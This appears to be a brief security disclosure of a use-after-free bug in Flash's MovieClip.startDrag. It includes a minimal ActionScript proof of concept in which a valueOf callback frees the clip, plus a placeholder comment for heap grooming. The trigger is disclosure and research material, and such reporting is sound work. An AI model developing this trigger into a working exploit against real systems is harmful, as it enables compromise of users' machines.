 
There is a use-after-free in MovieClip.startDrag. If a parameter an object with valueOf defined, this method can free the MovieClip, which is then used.
 
A minimal POC follows:
 
this.createEmptyMovieClip("mc", 1);
mc.startDrag( true, {valueOf : func}, 1, 2, 3, 4);
 
 
function func(){
     
    mc.removeMovieClip();
     
        // Fix heap here
 
    return 1;
     
    }
     
A sample fla and swf are attached.
